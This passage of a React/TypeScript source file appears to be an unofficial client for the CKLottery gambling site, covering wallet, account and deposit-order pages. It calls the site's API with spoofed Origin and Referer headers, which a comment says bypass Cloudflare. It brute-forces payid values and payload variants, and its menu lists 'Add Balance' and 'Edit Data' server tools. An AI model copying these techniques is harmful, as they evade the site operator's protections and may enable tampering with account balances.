                {b.claimed !== undefined && <div className="bg-blue-50 text-blue-400 text-xs px-2 py-0.5 rounded-full">💙 {b.claimed}</div>}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── Helpers ───────────────────────────────────────────────────────────────────
function camel(k: string) {
  return k.replace(/([A-Z])/g, " $1").trim();
}

function isScalar(v: unknown): v is string | number | boolean {
  return typeof v === "string" || typeof v === "number" || typeof v === "boolean";
}

function pick(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] !== undefined && obj[k] !== null && obj[k] !== "") return obj[k];
  return undefined;
}

// Generic flat-record card — shows every scalar field it finds
function RecordFields({ item, skip = [] }: { item: Record<string, unknown>; skip?: string[] }) {
  const entries = Object.entries(item).filter(
    ([k, v]) => !skip.includes(k) && isScalar(v) && v !== ""
  );
  if (entries.length === 0) return null;
  return (
    <div className="flex flex-wrap gap-x-4 gap-y-1 mt-1">
      {entries.map(([k, v]) => (
        <div key={k} className="text-xs text-gray-400 min-w-0">
          {camel(k)}: <span className="text-gray-600">{String(v)}</span>
        </div>
      ))}
    </div>
  );
}

// ─── Wallet Page ───────────────────────────────────────────────────────────────
function WalletPage({ wallets, loading, error, onBack }: { wallets: Record<string, unknown> | null; loading: boolean; error: string; onBack: () => void }) {
  return (
    <SubPage title="💳 Wallet" onBack={onBack}>
      <ListState loading={loading} error={error} empty={!loading && !error && !wallets} />
      {!loading && !error && wallets && (
        <div className="space-y-2">
          {/* Scalar top-level fields */}
          {Object.entries(wallets)
            .filter(([, v]) => isScalar(v) && v !== "" && v !== null && v !== undefined)
            .map(([k, v]) => (
              <div key={k} className="bg-white rounded-2xl shadow-sm p-4 flex justify-between items-center">
                <span className="text-sm text-gray-600 capitalize">{camel(k)}</span>
                <span className="text-sm font-bold text-gray-800">
                  {typeof v === "number" || (typeof v === "string" && !isNaN(Number(v)))
                    ? `K${v}`
                    : String(v)}
                </span>
              </div>
            ))}
          {/* Array fields — game wallets etc. */}
          {Object.entries(wallets)
            .filter(([, v]) => Array.isArray(v) && (v as unknown[]).length > 0)
            .map(([k, v]) => {
              const items = v as Record<string, unknown>[];
              return (
                <div key={k} className="bg-white rounded-2xl shadow-sm overflow-hidden">
                  <div className="px-4 py-2 bg-gray-50 border-b border-gray-100">
                    <span className="text-xs font-semibold text-gray-500 uppercase tracking-wide">{camel(k)}</span>
                  </div>
                  {items.map((item, i) => {
                    const name = String(pick(item, ["platName", "gameName", "name", "typeName"]) ?? `#${i + 1}`);
                    const bal = pick(item, ["balance", "gameBalance", "platBalance", "amount", "money"]);
                    return (
                      <div key={i} className="px-4 py-3 flex justify-between items-center border-b border-gray-50 last:border-0">
                        <span className="text-sm text-gray-600">{name}</span>
                        <span className="text-sm font-bold text-gray-800">
                          {bal !== undefined ? `K${bal}` : "—"}
                        </span>
                      </div>
                    );
                  })}
                </div>
              );
            })}
        </div>
      )}
    </SubPage>
  );
}

// ─── Main / Account Page ───────────────────────────────────────────────────────
function MainPage({ claims, userInfo, balance, balanceLoading, balanceError, tokenExpired, onNav, onLogout, onRefreshBalance }: { claims: Record<string, unknown> | null; userInfo: Record<string, unknown> | null; balance: string; balanceLoading: boolean; balanceError: string; tokenExpired: boolean; onNav: (p: Page) => void; onLogout: () => void; onRefreshBalance: () => void }) {
  const nickName = String(claims?.NickName || userInfo?.nickName || "Account").toUpperCase();
  const userId = String(claims?.UserId || userInfo?.userId || "—");
  const lastLogin = String(claims?.LoginTime || userInfo?.loginTime || "—");
  const vipLevel = userInfo?.vipLevel ?? claims?.vipLevel ?? 4;

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col pb-20">
      <div className="bg-gradient-to-r from-blue-500 to-blue-600 px-5 pt-12 pb-6">
        <div className="flex items-center gap-3">
          <div className="relative shrink-0">
            <div className="w-16 h-16 rounded-full bg-gray-800 flex items-center justify-center text-3xl shadow-lg">🧑‍🦯</div>
            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 bg-gradient-to-r from-yellow-400 to-orange-400 text-white text-[9px] font-bold px-1.5 py-0.5 rounded-full shadow whitespace-nowrap">⭐VIP{String(vipLevel)}</div>
          </div>
          <div className="flex-1 min-w-0">
            <div className="text-white font-bold truncate">{nickName}</div>
            <div className="mt-1"><span className="bg-orange-400 text-white text-xs px-2 py-0.5 rounded-full font-medium">UID ｜ {userId}</span></div>
            <div className="text-blue-100 text-xs mt-1">Last login: {lastLogin}</div>
          </div>
          <button onClick={onLogout} className="shrink-0 text-white/80 text-xs bg-white/15 border border-white/20 px-3 py-1.5 rounded-full">Logout</button>
        </div>
      </div>

      {tokenExpired && <ExpiredBanner onLogout={onLogout} />}

      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-5">
        <div className="flex items-center justify-between mb-1">
          <div className="text-gray-400 text-sm">Total balance</div>
          <button
            type="button"
            onClick={onRefreshBalance}
            disabled={balanceLoading}
            className="text-blue-400 text-xs flex items-center gap-1 active:opacity-60 disabled:opacity-40"
          >
            <span className={balanceLoading ? "animate-spin inline-block" : ""}>↻</span>
            {balanceLoading ? "Fetching…" : "Refresh"}
          </button>
        </div>
        <div className="text-gray-900 font-bold text-4xl">
          {balanceLoading && balance === "—" ? (
            <span className="text-gray-300 text-2xl">Loading…</span>
          ) : (
            <>K{balance}</>
          )}
        </div>
        {balanceError && (
          <div className="text-xs text-red-400 mt-1 truncate">{balanceError}</div>
        )}
      </div>

      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-5">
        <div className="grid grid-cols-4 gap-2">
          {([
            { icon: "💳", label: "Wallet", page: "wallet" },
            { icon: "📥", label: "Deposit", page: "deposit" },
            { icon: "📤", label: "Withdraw", page: "withdraw" },
            { icon: "💎", label: "VIP", page: "vip" },
          ] as const).map((a) => (
            <button key={a.page} type="button" onClick={() => onNav(a.page)} className="flex flex-col items-center gap-2 active:opacity-70">
              <div className="w-14 h-14 rounded-full bg-gray-50 border border-gray-100 flex items-center justify-center text-2xl shadow-sm">{a.icon}</div>
              <span className="text-xs text-gray-600">{a.label}</span>
            </button>
          ))}
        </div>
      </div>

      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-4 flex items-center gap-3">
        <div className="w-12 h-12 rounded-2xl bg-yellow-50 flex items-center justify-center text-2xl shrink-0">🔒</div>
        <div className="flex-1">
          <div className="text-gray-800 font-semibold text-sm">Safe</div>
          <div className="text-gray-400 text-xs mt-0.5 leading-tight">Daily interest 0.5%, calculated every minute.</div>
        </div>
        <div className="text-orange-400 font-bold text-sm whitespace-nowrap shrink-0">K0.00 ›</div>
      </div>

      <div className="mx-4 mt-3 grid grid-cols-2 gap-3">
        {([
          { icon: "🎮", label: "Game History", sub: "My game history", page: "game" },
          { icon: "💸", label: "Transaction", sub: "My transaction history", page: "transaction" },
          { icon: "📥", label: "Deposit", sub: "My deposit history", page: "deposit" },
          { icon: "📤", label: "Withdraw", sub: "My withdraw history", page: "withdraw" },
          { icon: "➕", label: "Add Balance", sub: "Direct credit tool", page: "addBalance" },
          { icon: "🔑", label: "Token Info", sub: "All data & controls", page: "tokenInfo" },
          { icon: "✏️", label: "Edit Data", sub: "Change data on server", page: "editData" },
        ] as const).map((h) => (
          <button key={h.page} type="button" onClick={() => onNav(h.page)} className="bg-white rounded-2xl shadow-sm p-4 flex items-center gap-3 text-left active:opacity-70">
            <div className="w-10 h-10 rounded-xl bg-blue-50 flex items-center justify-center text-xl shrink-0">{h.icon}</div>
            <div className="min-w-0">
              <div className="text-gray-800 text-sm font-semibold">{h.label}</div>
              <div className="text-gray-400 text-xs">{h.sub}</div>
            </div>
          </button>
        ))}
      </div>

      {/* Bottom nav */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 flex justify-around items-end py-2 z-20">
        <button type="button" onClick={() => onNav("home")} className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🏠</span>
          <span className="text-[10px] text-gray-500">Home</span>
        </button>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🎁</span>
          <span className="text-[10px] text-gray-500">Activity</span>
        </button>
        <div className="flex flex-col items-center gap-0.5">
          <div className="w-14 h-14 -mt-5 rounded-full bg-gradient-to-t from-orange-500 to-orange-300 flex items-center justify-center text-2xl shadow-lg">🎰</div>
          <span className="text-[10px] text-orange-500 font-bold">Get K20,000</span>
        </div>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">💰</span>
          <span className="text-[10px] text-gray-500">Promotion</span>
        </button>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">👤</span>
          <span className="text-[10px] text-blue-500 font-bold">Account</span>
        </button>
      </div>
    </div>
  );
}

// ─── Deposit How-To Guide ──────────────────────────────────────────────────────
function DepositHowTo() {
  const [open, setOpen] = useState(false);
  const steps = [
    { icon: "1️⃣", title: "Enter the amount", desc: "Type how much you want to deposit (e.g. K5,000), or tap a preset button." },
    { icon: "2️⃣", title: "Select a payment method", desc: "Choose Wave Pay, KBZ Pay, AYA Pay, or CB Pay. The one with ✓ is selected." },
    { icon: "3️⃣", title: "Tap the Deposit button", desc: 'Tap the blue "Deposit K…" button at the bottom. Wait a moment.' },
    { icon: "4️⃣", title: "You'll see payment details", desc: "The app will show you a bank account number, QR code, or payment link." },
    { icon: "5️⃣", title: "Transfer the money", desc: "Open Wave Pay / KBZ Pay on your phone and send the exact amount to the account shown." },
    { icon: "6️⃣", title: "Submit your Transaction ID (UTR)", desc: "After sending, paste your transaction reference number into the UTR box and tap Submit UTR." },
  ];

  return (
    <div className="mb-3 rounded-2xl border border-green-100 bg-green-50 overflow-hidden">
      <button
        type="button"
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-3 text-left"
      >
        <div className="flex items-center gap-2 text-green-700 font-semibold text-sm">
          <span>📖</span> How to deposit — tap to see steps
        </div>
        <span className="text-green-400 text-lg">{open ? "▲" : "▼"}</span>
      </button>
      {open && (
        <div className="px-4 pb-4 space-y-3">
          {steps.map((s, i) => (
            <div key={i} className="flex gap-3 items-start">
              <span className="text-xl shrink-0 leading-none mt-0.5">{s.icon}</span>
              <div>
                <div className="text-sm font-semibold text-gray-800">{s.title}</div>
                <div className="text-xs text-gray-500 mt-0.5">{s.desc}</div>
              </div>
            </div>
          ))}
          <div className="bg-yellow-50 border border-yellow-200 rounded-xl px-3 py-2 text-xs text-yellow-800 mt-1">
            ⚠️ Make sure you send the <strong>exact</strong> amount shown. Wrong amounts may not be credited.
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Deposit New Page ──────────────────────────────────────────────────────────
type DepositMethod = { id: number | string; name: string; code?: string; logo?: string; emoji?: string; minMoney?: number; maxMoney?: number; [key: string]: unknown };

// IDs from real deposit history: WavePay type=158 payTypeId=18, KBZ type=157 payTypeId=17
const FALLBACK_METHODS: DepositMethod[] = [
  { id: 158, payTypeId: 18, name: "Wave Pay", typeName: "Wave Pay", emoji: "🌊" },
  { id: 157, payTypeId: 17, name: "KBZ Pay", typeName: "KBZ Pay", emoji: "🏦" },
  { id: 160, payTypeId: 20, name: "AYA Pay", typeName: "AYA Pay", emoji: "💳" },
  { id: 161, payTypeId: 21, name: "CB Pay", typeName: "CB Pay", emoji: "💰" },
];

function isAuthError(msg: string) {
  return msg.toLowerCase().includes("permission") || msg.toLowerCase().includes("401") || msg.toLowerCase().includes("expir");
}

function DepositNewPage({ session, onBack, onLogout }: { session: UserSession; onBack: () => void; onLogout: () => void }) {
  const [methods, setMethods] = useState<DepositMethod[]>([]);
  const [methodsLoading, setMethodsLoading] = useState(true);
  const [methodsError, setMethodsError] = useState("");
  const [usingFallback, setUsingFallback] = useState(false);
  const [selected, setSelected] = useState<DepositMethod | null>(null);
  const [amount, setAmount] = useState("5000");
  const [payerName, setPayerName] = useState("");
  const [remark, setRemark] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [orderResult, setOrderResult] = useState<Record<string, unknown> | null>(null);
  const [orderDuplicate, setOrderDuplicate] = useState(false);
  const [channelUnsupported, setChannelUnsupported] = useState(false);
  const [utr, setUtr] = useState("");
  const [utrSubmitting, setUtrSubmitting] = useState(false);
  const [utrError, setUtrError] = useState("");
  const [utrSuccess, setUtrSuccess] = useState(false);
  const [methodsRawDebug, setMethodsRawDebug] = useState("");

  const DEFAULT_PRESETS = [1000, 2000, 5000, 10000, 20000, 50000];

  // The proxy server is Cloudflare-blocked by CKLottery — only direct browser calls work.
  async function loadMethods() {
    setMethodsLoading(true); setMethodsError(""); setUsingFallback(false); setMethodsRawDebug("");
    let list: DepositMethod[] = [];
    // Direct browser call — only path that bypasses Cloudflare.
    // GetRechargeTypes requires "payid" > 0. We don't know the correct value per-account,
    // so try a range of known/common values and use the first that returns actual methods.
    const auth = session.tokenHeader ? `${session.tokenHeader} ${session.token}`.trim() : session.token;
    // Try values 1-20 plus historically-known fallback IDs
    const payidsToTry = [...Array.from({length: 20}, (_, i) => i + 1), 157, 158, 160, 161, 18, 17, 20, 21];
    let lastDebug = "";
    let foundPayid = 0;
    for (const payid of payidsToTry) {
      try {
        const signRes = await fetch("/api/proxy/sign", {
          method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ payid }),
        });
        const signed = await signRes.json() as Record<string, unknown>;
        const res = await fetch(`https://ckygjf6r.com/api/webapi/GetRechargeTypes`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": auth,
            "Origin": "https://www.cklottery.club",
            "Referer": "https://www.cklottery.club/",
          },
          body: JSON.stringify(signed),
        });
        const text = await res.text();
        lastDebug = `payid=${payid}: ${text.slice(0, 400)}`;
        setMethodsRawDebug(lastDebug);
        const parsed = JSON.parse(text) as Record<string, unknown>;
        if (parsed.code === 0 || parsed.code === 200 || parsed.code === undefined) {
          // Use extractAllMethods to collect from all list types in the response
          const found = extractAllMethods(parsed) as DepositMethod[];
          if (found.length > 0) {
            foundPayid = payid;
            list = found.map(m => ({ ...m, _payid: payid }));
            break;
          }
          // code:0 but all lists empty — continue trying other payids
        }
        // Non-zero code — try next payid
      } catch {
        // network/parse error — try next payid
      }
    }
    if (list.length === 0) {
      setMethodsError(`No payment methods found (tried payid 1–20 + known IDs). Last response: ${lastDebug.slice(0, 350)}`);
    } else {
      // Show payid + raw keys of first method for debugging
      const firstKeys = list.length > 0 ? JSON.stringify(Object.keys(list[0])) : "";
      const firstRaw = list.length > 0 ? JSON.stringify(list[0]).slice(0, 300) : "";
      setMethodsRawDebug(`✓ payid=${foundPayid}, ${list.length} method(s). First item keys: ${firstKeys} | raw: ${firstRaw}`);
    }
    if (list.length > 0) {
      // Assign a stable _idx so selection works even when id is undefined
      const indexed = list.map((m, i) => ({ ...m, _idx: i }));
      setMethods(indexed as DepositMethod[]);
      setSelected(indexed[0] as DepositMethod);
    } else {
      setMethods(FALLBACK_METHODS);
      setSelected(FALLBACK_METHODS[0]);
      setUsingFallback(true);
    }
    setMethodsLoading(false);
  }

  useEffect(() => { loadMethods(); }, []);

  async function submit() {
    if (!selected || !amount || Number(amount) <= 0) return;
    if (usingFallback) {
      setSubmitError("Payment methods could not be loaded from the server. Tap the ↻ Reload button above to try again before depositing.");
      return;
    }
    setSubmitting(true); setSubmitError(""); setOrderDuplicate(false); setChannelUnsupported(false);
    const selObj = selected as Record<string, unknown>;
    const groupPayid = Number(selObj._payid ?? selObj.payID ?? 0);
    const payTypeIDVal = Number(selObj.payTypeID ?? selObj.payTypeId ?? 0);
    const pasSysNum = Number(selObj.paySysName ?? selObj.sysName ?? 0);

    const extras: Record<string, unknown> = {};
    if (selected.code) extras.rechargeType = selected.code;
    if (payerName.trim()) extras.payerName = payerName.trim();
    if (remark.trim()) extras.remark = remark.trim();

    const base = { amount: Number(amount), ReturnUrl: "https://www.cklottery.club/", ...extras };

    // Build a list of distinct payload variants to try in order.
    // The "type must greater than 0" error persists regardless of the value sent as `type`,
    // so we also try: different parameter names (payTypeId vs type), with/without payid,
    // and finally alternate endpoints used by third-party (H88Pay) channels.
    const variants: Record<string, unknown>[] = [];
    function addVariant(extra: Record<string, unknown>) {
      // Deduplicate by JSON key
      const key = JSON.stringify(Object.keys({ ...base, ...extra }).sort());
      const vals = JSON.stringify({ ...base, ...extra });
      if (!variants.some(v => JSON.stringify(v) === vals)) variants.push({ ...base, ...extra });
    }

    // 1. payTypeId (lowercase d) as the type param — CKLottery backend may differ from API response field name
    if (payTypeIDVal > 0) {
      addVariant({ payTypeId: payTypeIDVal, payid: groupPayid });
      addVariant({ payTypeId: payTypeIDVal });
    }
    // 2. type=payTypeID with payid
    if (payTypeIDVal > 0 && groupPayid > 0) addVariant({ type: payTypeIDVal, payid: groupPayid });
    // 3. type=payTypeID without payid
    if (payTypeIDVal > 0) addVariant({ type: payTypeIDVal });
    // 4. type=paySysNum (e.g. 102) variants
    if (pasSysNum > 0 && pasSysNum !== payTypeIDVal) {
      if (groupPayid > 0) addVariant({ type: pasSysNum, payid: groupPayid });
      addVariant({ type: pasSysNum });
    }
    // 5. payid only, no type
    if (groupPayid > 0) addVariant({ payid: groupPayid });
    // 6. payid=payTypeID (swap roles)
    if (payTypeIDVal > 0) addVariant({ payid: payTypeIDVal });
    // 7. Bare — just amount + ReturnUrl
    addVariant({});

    const tried: string[] = [];
    let lastErr = "";

    function classifyError(msg: string): "duplicate" | "unsupported" | "recoverable" | "fatal" {
      const m = msg.toLowerCase();
      if (m.includes("resubmit") || m.includes("do not submit") || m.includes("already") || m.includes("duplicate") || m.includes("repeat") || m.includes("pending order") || m.includes("processing")) return "duplicate";
      if (m.includes("not supported") || m.includes("channel") || m.includes("unavailable") || m.includes("not open") || m.includes("maintenance")) return "unsupported";
      if (m.includes("type") || m.includes("greater than 0") || m.includes("invalid") || m.includes("param") || m.includes("illegal")) return "recoverable";
      return "fatal";
    }

    for (const variant of variants) {
      const label = JSON.stringify(
        Object.fromEntries(Object.entries(variant).filter(([k]) => !["amount","ReturnUrl","payerName","remark","rechargeType"].includes(k)))
      );
      tried.push(label);
      try {
        const d = await apiPost("CreateRechargeOrder", variant, session);
        const data = (d?.data ?? d) as Record<string, unknown>;
        setOrderResult(data && typeof data === "object" ? data : d);
        setSubmitting(false);
        return;
      } catch (e) {
        const msg = String(e);
        lastErr = msg;
        const kind = classifyError(msg);
        if (kind === "duplicate") {
          // Order was already created (CORS ate the success response on first attempt).
          setOrderDuplicate(true); setSubmitting(false); return;
        }
        if (kind === "unsupported") {
          setChannelUnsupported(true); setSubmitting(false); return;
        }
        if (kind === "fatal") {
          setSubmitError(msg); setSubmitting(false); return;
        }
        // "recoverable" → continue cascade
      }
    }

    // All variants failed — also try CreateThirdRechargeOrder (used by external gateway methods)
    try {
      const d = await apiPost("CreateThirdRechargeOrder", { ...base, type: payTypeIDVal, payid: groupPayid }, session);
      const data = (d?.data ?? d) as Record<string, unknown>;
      setOrderResult(data && typeof data === "object" ? data : d);
    } catch (e) {
      const msg = String(e);
      const kind = classifyError(msg);
      if (kind === "duplicate") { setOrderDuplicate(true); }
      else if (kind === "unsupported") { setChannelUnsupported(true); }
      else { setSubmitError(`${lastErr}\n\nTried ${tried.length} payload variants + alternate endpoint.`); }
    } finally {
      setSubmitting(false);
    }
  }

  // ── Order success / payment details ──
  function strPick(obj: Record<string, unknown>, keys: string[]): string | undefined {
    const v = pick(obj, keys);
    return v !== undefined ? String(v) : undefined;
  }

  if (orderDuplicate) {
    return (
      <SubPage title="⏳ Order Pending" onBack={() => { setOrderDuplicate(false); }}>
        <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 mb-4 flex items-start gap-3">
          <span className="text-2xl mt-0.5">⚠️</span>
          <div>
            <div className="text-amber-800 font-semibold text-sm mb-1">Order Already Created</div>
            <div className="text-amber-700 text-sm leading-relaxed">
              A deposit order for this amount was already submitted. CKLottery prevents creating duplicate orders while one is still pending.
            </div>
          </div>
        </div>
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-4 text-sm text-gray-600 leading-relaxed space-y-2">
          <p>Your previous order is waiting for payment. To find your order details:</p>
          <ol className="list-decimal list-inside space-y-1 text-gray-700">
            <li>Go to <strong>Deposit History</strong> in the main menu</li>
            <li>Find the pending order at the top of the list</li>
            <li>Tap it to see the payment account, QR code, or payment link</li>
          </ol>
        </div>
        <button
          type="button"
          className="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-3"
          onClick={() => setOrderDuplicate(false)}
        >
          ← Back to Deposit
        </button>
      </SubPage>
    );
  }

  if (channelUnsupported) {
    return (
      <SubPage title="❌ Channel Unavailable" onBack={() => setChannelUnsupported(false)}>
        <div className="bg-red-50 border border-red-200 rounded-2xl p-5 mb-4 flex items-start gap-3">
          <span className="text-2xl mt-0.5">🚫</span>
          <div>
            <div className="text-red-800 font-semibold text-sm mb-1">Channel Not Supported</div>
            <div className="text-red-700 text-sm leading-relaxed">
              This payment channel is not available for your account or region. Please select a different payment method.
            </div>
          </div>
        </div>
        <button
          type="button"
          className="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80"
          onClick={() => setChannelUnsupported(false)}
        >
          ← Choose Another Method
        </button>
      </SubPage>
    );
  }

  if (orderResult) {
    const payUrl = strPick(orderResult, ["payUrl", "url", "qrUrl", "payLink", "redirectUrl"]);
    const qrCode = strPick(orderResult, ["qrCode", "qrCodeUrl", "scanCode", "qr"]);
    const orderNo = strPick(orderResult, ["orderNum", "orderNo", "serialNo", "id", "orderId"]);
    const bankAcc = strPick(orderResult, ["bankAccount", "accountNo", "receiveAccount", "bankNo", "cardNo"]);
    const bankName = strPick(orderResult, ["bankName", "receiveBankName", "payBankName"]);
    const holderName = strPick(orderResult, ["accountName", "receiveName", "holderName"]);
    const ifsc = strPick(orderResult, ["ifscCode", "ifsc", "bankCode"]);
    const upiId = strPick(orderResult, ["upiId", "upiAccount", "vpa"]);

    return (
      <SubPage title="📋 Payment Details" onBack={() => setOrderResult(null)}>
        <div className="bg-green-50 border border-green-200 rounded-2xl p-4 mb-4 flex items-center gap-3">
          <span className="text-2xl">✅</span>
          <div>
            <div className="text-green-800 font-semibold text-sm">Order Created!</div>
            <div className="text-green-600 text-xs">Complete the payment below to top up your account.</div>
          </div>
        </div>

        {orderNo && (
          <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
            <div className="text-xs text-gray-400 mb-1">Order Number</div>
            <div className="font-mono text-sm text-gray-800 break-all">{String(orderNo)}</div>
          </div>
        )}

        {(bankAcc || bankName || holderName || ifsc || upiId) && (
          <div className="bg-white rounded-2xl shadow-sm p-4 mb-3 space-y-3">
            <div className="text-sm font-semibold text-gray-700">Payment Instructions</div>
            {bankName && <InfoRow label="Bank" value={String(bankName)} />}
            {bankAcc && <InfoRow label="Account No." value={String(bankAcc)} copyable />}
            {holderName && <InfoRow label="Account Name" value={String(holderName)} copyable />}
            {ifsc && <InfoRow label="IFSC / Code" value={String(ifsc)} copyable />}
            {upiId && <InfoRow label="UPI ID" value={String(upiId)} copyable />}
          </div>
        )}

        {qrCode && (
          <div className="bg-white rounded-2xl shadow-sm p-4 mb-3 flex flex-col items-center gap-2">
            <div className="text-sm font-semibold text-gray-700">Scan QR Code</div>
            <img src={String(qrCode)} alt="QR Code" className="w-48 h-48 object-contain rounded-xl border border-gray-100" />
          </div>
        )}

        {payUrl && (
          <a href={String(payUrl)} target="_blank" rel="noreferrer"
            className="block w-full bg-blue-500 text-white text-center py-4 rounded-2xl font-bold text-base shadow mb-3 active:opacity-80">
            Open Payment Page →
          </a>
        )}

        {/* Show any other scalar fields not already displayed */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Full Order Details</div>
          <RecordFields item={orderResult} skip={["payUrl","url","qrUrl","payLink","redirectUrl","qrCode","qrCodeUrl","scanCode","qr","orderNum","orderNo","serialNo","id","orderId","bankAccount","accountNo","receiveAccount","bankNo","cardNo","bankName","receiveBankName","payBankName","accountName","receiveName","holderName","ifscCode","ifsc","bankCode","upiId","upiAccount","vpa"]} />
        </div>

        {/* ── UTR / Transaction ID submission ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-semibold text-gray-700 mb-1">Submit Transaction ID (UTR)</div>
          <div className="text-xs text-gray-400 mb-3">After you complete the payment, enter your UTR or transaction reference number here to confirm your deposit.</div>
          {utrSuccess ? (
            <div className="bg-green-50 border border-green-200 rounded-xl px-4 py-3 text-green-700 text-sm flex items-center gap-2">
              <span>✅</span> UTR submitted successfully! Your deposit is under review.
            </div>
          ) : (
            <>
              <input
                type="text"
                placeholder="Enter UTR / Transaction ID"
                value={utr}
                onChange={(e) => setUtr(e.target.value)}
                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 focus:outline-none focus:border-blue-400 bg-gray-50 mb-2"
              />
              {utrError && (
                <div className="text-red-600 text-xs mb-2">{utrError}</div>
              )}
              <button
                type="button"
                disabled={utrSubmitting || !utr.trim()}
                onClick={() => {
                  if (!utr.trim()) return;
                  setUtrSubmitting(true); setUtrError("");
                  const utrPayload: Record<string, unknown> = {
                    utr: utr.trim(),
                    orderNum: orderNo ?? "",
                  };
                  apiPost("ArUpiSubmitUtr", utrPayload, session)
                    .then(() => setUtrSuccess(true))
                    .catch((e: unknown) => {
                      // fallback: try UpRechargesBankOrder
                      const errStr = String(e);
                      if (errStr.toLowerCase().includes("not found") || errStr.includes("404")) {
                        apiPost("UpRechargesBankOrder", { ...utrPayload, transactionId: utr.trim() }, session)
                          .then(() => setUtrSuccess(true))
                          .catch((e2: unknown) => setUtrError(String(e2)));
                      } else {
                        setUtrError(errStr);
                      }
                    })
                    .finally(() => setUtrSubmitting(false));
                }}
                className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold py-3 rounded-xl text-sm shadow disabled:opacity-50 disabled:cursor-not-allowed active:opacity-90">
                {utrSubmitting ? "Submitting…" : "Submit UTR"}
              </button>
            </>
          )}
        </div>
      </SubPage>
    );
  }

  return (
    <SubPage title="💰 Add Money" onBack={onBack}>
      {/* How-to guide */}
      <DepositHowTo />

      {/* Amount input */}
      <div className="bg-white rounded-2xl shadow-sm p-5 mb-3">
        <div className="text-sm font-semibold text-gray-700 mb-3">Enter Amount (MMK)</div>
        <div className="relative mb-3">
          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-lg">K</span>
          <input
            type="number"
            inputMode="numeric"
            placeholder="0"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="w-full border border-gray-200 rounded-2xl pl-8 pr-4 py-4 text-2xl font-bold text-gray-900 focus:outline-none focus:border-blue-400 bg-gray-50"
          />
        </div>
        {(() => {
          const sel = selected as Record<string, unknown> | null;
          const scopeStr = sel?.scope as string | undefined;
          const presets: number[] = scopeStr
            ? scopeStr.split("|").map(Number).filter((n) => Number.isFinite(n) && n > 0)
            : DEFAULT_PRESETS;
          const display = presets.slice(0, 6);
          return (
            <div className={`grid gap-2 ${display.length <= 3 ? "grid-cols-3" : display.length === 4 ? "grid-cols-4" : "grid-cols-3"}`}>
              {display.map((p) => (
                <button key={p} type="button"
                  onClick={() => setAmount(String(p))}
                  className={`py-2 rounded-xl text-sm font-semibold border transition-colors ${amount === String(p) ? "bg-blue-500 text-white border-blue-500" : "bg-gray-50 text-gray-700 border-gray-200 active:bg-blue-50"}`}>
                  K{p.toLocaleString()}
                </button>
              ))}
            </div>
          );
        })()}
      </div>


      {/* Token-expired warning */}
      {methodsError && isAuthError(methodsError) && (
        <div className="bg-orange-50 border border-orange-200 rounded-2xl p-4 mb-3">
          <div className="flex items-center gap-2 mb-2">
            <span className="text-lg">⚠️</span>
            <span className="text-orange-800 font-semibold text-sm">Token Expired</span>
          </div>
          <p className="text-orange-700 text-xs mb-3">Your session token has expired. Deposit orders require a fresh token — please log out and paste a new one from cklottery.club.</p>
          <button type="button" onClick={onLogout}
            className="w-full bg-orange-500 text-white font-semibold py-2.5 rounded-xl text-sm active:opacity-80">
            Logout &amp; Refresh Token
          </button>
        </div>
      )}
      {/* Debug info — only shown on error, hidden when methods load successfully */}
      {methodsError && !isAuthError(methodsError) && (
        <div className="bg-gray-50 border border-gray-200 rounded-2xl p-3 mb-3">
          <div className="text-xs font-semibold text-gray-500 mb-1">⚙️ Debug info (share this if deposit fails)</div>
          <div className="text-xs text-gray-700 break-all font-mono whitespace-pre-wrap max-h-40 overflow-y-auto">
            {methodsRawDebug || methodsError}
          </div>
        </div>
      )}

      {/* Payment method */}
      <div className="bg-white rounded-2xl shadow-sm p-5 mb-3">
        <div className="flex items-center justify-between mb-3">
          <div className="text-sm font-semibold text-gray-700">Payment Method</div>
          <button type="button" onClick={loadMethods} disabled={methodsLoading}
            className="text-xs text-blue-500 bg-blue-50 px-2 py-0.5 rounded-full active:opacity-70 disabled:opacity-40">
            ↻ Reload
          </button>
        </div>
        {usingFallback && (
          <div className="bg-orange-50 border border-orange-200 rounded-xl px-3 py-2 mb-3 text-xs text-orange-800 flex items-start gap-2">
            <span className="text-base shrink-0">⚠️</span>
            <span>Payment methods could not be loaded from the server. Tap <strong>↻ Reload</strong> above — if it keeps failing, your token may have expired.</span>
          </div>
        )}
        {methodsLoading && <div className="text-center py-6 text-gray-400 text-sm">Loading methods…</div>}
        {!methodsLoading && methods.length > 0 && (
          <div className="space-y-2">
            {methods.map((m) => (
              <button key={(m as Record<string,unknown>)._idx as number ?? String(m.id)} type="button"
                onClick={() => setSelected(m)}
